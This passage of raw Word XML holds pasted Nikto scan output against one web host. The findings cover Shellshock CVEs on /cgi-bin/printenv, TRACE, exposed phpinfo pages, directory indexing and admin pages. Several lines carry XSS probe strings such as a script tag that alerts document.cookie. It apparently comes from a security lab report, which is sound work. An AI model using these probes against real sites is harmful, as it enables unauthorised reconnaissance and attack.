          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>HTTP_NOT_FOUND.html.var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="66D043F5"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Web Server returns a valid response with junk HTTP methods, this may cause false positives.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECBFF85"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OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53167246"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OSVDB-112004: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>printenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2AC2EB"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OSVDB-112004: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>printenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468482E5"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo.php?VARIABLE</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>=&lt;script&gt;alert('Vulnerable</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>')&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">/script&gt;: Output from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>() function was found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649E56A4"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>config.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: PHP Config file may contain database IDs and passwords.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296ECE69"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xml:space="preserve">+ OSVDB-12184: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/?=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF15D26"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xml:space="preserve">+ OSVDB-12184: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/?=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388F4DD3"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xml:space="preserve">+ OSVDB-12184: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/?=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA97B61"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xml:space="preserve">+ OSVDB-12184: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/?=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CEF2F60"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OSVDB-3233: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>printenv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: Apache 2.0 default script is executable and gives server environment variables. All default scripts should be removed. It may also allow XSS types of attacks. http://www.securityfocus.com/bid/4431.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF94885"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OSVDB-3233: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>-bin/test-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: Apache 2.0 default script is executable and reveals system information. All default scripts should be removed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5FFD90"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">: Output from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>) function was found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098F890F"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OSVDB-3233: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">: PHP is installed, and a test script which runs </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>) was found. This gives a lot of system information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6289AEC8"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OSVDB-3268: /icons/: Directory indexing found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5703208C"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lastRenderedPageBreak/>
        <w:t>+ OSVDB-3268: /images/: Directory indexing found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E04784C"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OSVDB-3268: /images/?pattern=/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>/*&amp;sort=name: Directory indexing found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C87C27D"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/phpinfo.php?</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>GLOBALS[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t xml:space="preserve">test]=&lt;script&gt;alert(document.cookie);&lt;/script&gt;: Output from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>() function was found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3D2F2A"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phpinfo.php?cx[]=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</w:t>
      </w:r>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">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&lt;script&gt;alert(foo)&lt;/script&gt;: Output from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>() function was found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694764E7"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OSVDB-3233: /icons/README: Apache default file found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F6DB7D"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>login.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>: Admin login page/section found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034F47FE"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+ 9308 requests: 0 error(s) and 34 item(s) reported on remote host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13899F3D"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End Time:           2018-11-08 09:37:34 (GMT-5) (35 seconds)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AE90FA"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FC7893" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Courier New" w:hAnsiTheme="minorHAnsi" w:cs="Courier New"/>
        </w:rPr>
        <w:t>+ 1 host(s) tested</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AA6A42" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/_catalogs/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>masterpage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/Forms/AllItems.aspx: FrontPage/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Sharepointfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BB2B10" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/_catalogs/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>wp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/Forms/AllItems.aspx: FrontPage/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Sharepointfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6FCA6B" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/_catalogs/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>wt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>/Forms/Common.aspx: FrontPage/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Sharepointfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> available.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB56142" w14:textId="77777777" w:rsidR="008831CC" w:rsidRPr="00D334C2" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>+ /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
